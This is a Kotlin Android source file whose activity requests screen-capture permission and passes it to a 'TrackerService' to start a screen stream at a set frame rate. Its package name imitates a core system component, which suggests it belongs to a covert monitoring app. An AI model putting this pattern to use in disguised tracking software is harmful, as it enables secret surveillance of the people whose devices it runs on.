package com.android.system.core

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle

class ScreenCaptureRequestActivity : Activity() {

    private var targetFps: Int = 1

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        targetFps = intent.getIntExtra("FPS", 1)

        val projectionManager = getSystemService(MediaProjectionManager::class.java)
        startActivityForResult(projectionManager.createScreenCaptureIntent(), 1000)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        android.util.Log.d("ScreenCapture", "onActivityResult: requestCode=$requestCode, resultCode=$resultCode")
        if (requestCode == 1000 && resultCode == RESULT_OK && data != null) {
            TrackerService.screenCaptureIntent = data
            TrackerService.screenCaptureResultCode = resultCode
            
            // Notify TrackerService to start the stream
            val intent = Intent(this, TrackerService::class.java)
            intent.action = "START_SCREEN_STREAM"
            intent.putExtra("FPS", targetFps)
            startService(intent)
        }
        finish()
    }
}
